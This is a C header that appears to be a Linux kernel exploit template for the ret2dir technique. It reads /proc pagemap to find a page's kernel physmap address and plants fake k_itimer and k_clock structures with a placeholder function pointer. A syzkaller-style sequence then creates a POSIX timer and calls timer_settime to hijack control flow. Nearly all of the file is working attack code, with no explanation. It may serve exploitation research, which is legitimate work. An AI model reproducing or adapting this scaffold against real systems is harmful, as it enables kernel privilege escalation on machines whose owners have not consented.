#ifndef _FILE_TMPL_H_
#define _FILE_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct k_itimer {
    char hole1[0x28];
    void *kclock;
    char hole2[0xb8];
};

struct k_clock {
	char hole1[0x30];
	void* timer_set;
	char hole2[0x38];
};

struct k_itimer fake_k_itimer;
struct k_clock fake_k_clock;;

unsigned overwrite_start = 0x28;
unsigned overwrite_end = 0x30;

void* victim_obj = (void*)&fake_k_itimer;

uint64_t kaddr = 0;

void do_setup_physmap() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		memset(&fake_k_itimer, 0x00, sizeof(struct k_itimer));
		fake_k_itimer.kclock = (void*)kaddr;
		fake_k_clock.timer_set = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
		memcpy((void*)USER_ADDR, &fake_k_clock, sizeof(struct k_clock));
    }
	return;
err:
	close(fd);
	exit(-1);
}

int fd;
uint64_t r[1] = {0x0};

void do_alloc_victim() {
  fd = open("test0", O_CREAT);
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  *(uint64_t*)0x20000040 = 0;
  *(uint32_t*)0x20000048 = 0x1f;
  *(uint32_t*)0x2000004c = 2;
  *(uint64_t*)0x20000050 = 0x20000000;
  memcpy((void*)0x20000000,
         "\x13\xe3\x19\xe7\x32\x52\x1b\x97\x3c\xba\xf7\xb6\x25\xd8\x01\x95\x78"
         "\xb0\xd1\x6c\x10\x2a\xb7\x4c\x2c\x88\x46\xe6\x71",
         29);
  *(uint64_t*)0x20000058 = 0x200000c0;
  memcpy((void*)0x200000c0,
         "\x3c\x6c\xe4\xd1\x1f\xdd\xd0\x70\xb5\x3a\x7c\x2b\x9c\xfd\xc7\xef\x45"
         "\xdd\x70\xd7\xb1\x8c\xb1\x9b\x69\x40\x87\x57\xb7\x4c\xaf\x5e\xfd\x3e"
         "\x99\xcb\xd1\x53\x9f\xa0\x4a\x8c\x9d\xdb\x25\x42\x75\x96\x79\x21\xfa"
         "\x71\x7d\xed\xa3\xb2\x9e\x5b\x62\x9f\x62\x00\x39\x0f\x5c\xd5\xab\xe1"
         "\xe6\xeb\x0d\xee\xdb\x10\x18\x63\x66\x03\xbe\xe1\xb4\xf9\x50\xbe\x33"
         "\xfa\x67\xf7\x3c\x23\xbf\x61\x3b\xa2\xac\x35\x51\x6c\x34\x72\xa4\x69"
         "\x7a\xb3\x04\x1d\xb1\x11\x8c\x85\x31\x6d\x36\x1e\x45\x17\xa3\xf8\xc2"
         "\xdf\x5e\x3b\x02\x33\xbd\xcc\x9d\xe8\x00\x38\x7f\x69\xe3\x58\x4a\x6a"
         "\x1d\x82\xfd\xcc\x2f\x54\xa4\x13\x39\x53\x3e\x56\x6c\x39\xee\x97\xfe"
         "\x94\x90\x74\xf5\x08\xdd\xd4\x8e\x69\xcd\xd3\x29\xa0\xf6\xa1\x90\x46"
         "\x75\xd7\xd3\xc4\x71\xae\x4b\xf8\x15\xf7\xc8\x65\xcd\x4e\xa7\x74\x09"
         "\x67\xe5\x0e\x05\x5e\x60\x1d\x2b\x68\x71\x1f\x13\xec\x64\xb3\x93\x61"
         "\xb7\x47\xd4\x72\x83\x4b\x72\xcc\x7b\xf9\x4a\xa9\x43\xfc\x97\x65\x28"
         "\xf0\x37\x86\x61\xe9\xb7\x0c\x17\xa3\x81\xe6\x47\xa4\xe5\x43\x45\x2a"
         "\xfe\x0c\x13\x73\x15\x87\xfb\x0d\x14\xa5\xd4\xb3\xe8\x88\x6f\xad",
         254);
  res = syscall(__NR_timer_create, 7, 0x20000040, 0x200001c0);
  if (res != -1)
    r[0] = *(uint32_t*)0x200001c0;	
}

void do_hijack() {
  *(uint64_t*)0x20000200 = 0x77359400;
  *(uint64_t*)0x20000208 = 0;
  *(uint64_t*)0x20000210 = 0;
  *(uint64_t*)0x20000218 = 0;
  syscall(__NR_timer_settime, r[0], 0, 0x20000200, 0x20000240);
}

#endif
